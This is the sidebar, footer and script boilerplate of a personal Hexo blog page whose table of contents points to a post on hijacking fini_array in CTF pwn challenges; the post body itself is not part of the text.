class="author-info__description">The closer you get  The less you see</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">52</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">34</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/s4ndw1ch136"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">VX:s4ndw1ch_vx</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81fini-array"><span class="toc-number">1.</span> <span class="toc-text">劫持fini_array</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Aciscn-2019-sw-1"><span class="toc-number">1.0.1.</span> <span class="toc-text">例题：ciscn_2019_sw_1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#checksec"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fini-array"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">fini_array</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp%EF%BC%9A"><span class="toc-number">1.0.2.</span> <span class="toc-text">exp：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982%EF%BC%9Apwnable-317-x64%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E7%A8%8B%E5%BA%8F%E7%9A%84fini-array%E5%8A%AB%E6%8C%81"><span class="toc-number">1.0.3.</span> <span class="toc-text">例题2：pwnable.317-x64静态编译程序的fini_array劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#checksec-1"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">checksec</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.0.4.</span> <span class="toc-text">exp:</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/6ba7641f.html" title="劫持fini_array"><img src="/img/wallhaven-jx1dmq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="劫持fini_array"/></a><div class="content"><a class="title" href="/post/6ba7641f.html" title="劫持fini_array">劫持fini_array</a><time datetime="2023-10-10T08:49:39.000Z" title="Created 2023-10-10 16:49:39">2023-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/2be638b5.html" title="西湖论剑_2018_小陈的笔记本加强版"><img src="/img/wallhaven-jx1dmq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="西湖论剑_2018_小陈的笔记本加强版"/></a><div class="content"><a class="title" href="/post/2be638b5.html" title="西湖论剑_2018_小陈的笔记本加强版">西湖论剑_2018_小陈的笔记本加强版</a><time datetime="2023-09-28T09:48:33.000Z" title="Created 2023-09-28 17:48:33">2023-09-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/20e7fcc5.html" title="inctf2018_wARMup"><img src="/img/arm.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="inctf2018_wARMup"/></a><div class="content"><a class="title" href="/post/20e7fcc5.html" title="inctf2018_wARMup">inctf2018_wARMup</a><time datetime="2023-09-27T09:10:40.000Z" title="Created 2023-09-27 17:10:40">2023-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/5442d6ff.html" title="指针未初始化漏洞-ciscn_2019_ne_6"><img src="/img/wallhaven-jx1dmq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="指针未初始化漏洞-ciscn_2019_ne_6"/></a><div class="content"><a class="title" href="/post/5442d6ff.html" title="指针未初始化漏洞-ciscn_2019_ne_6">指针未初始化漏洞-ciscn_2019_ne_6</a><time datetime="2023-09-26T06:22:52.000Z" title="Created 2023-09-26 14:22:52">2023-09-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/2385f4d0.html" title="劫持TLS(bypass canary)"><img src="/img/wallhaven-jx1dmq.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="劫持TLS(bypass canary)"/></a><div class="content"><a class="title" href="/post/2385f4d0.html" title="劫持TLS(bypass canary)">劫持TLS(bypass canary)</a><time datetime="2023-09-25T12:04:50.000Z" title="Created 2023-09-25 20:04:50">2023-09-25</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/wallhaven-jx1dmq.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By s4ndw1ch</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo" title=""><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题使用Butterfly" title=""><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime.js"></script><!-- hexo injector body_end end --></body></html>
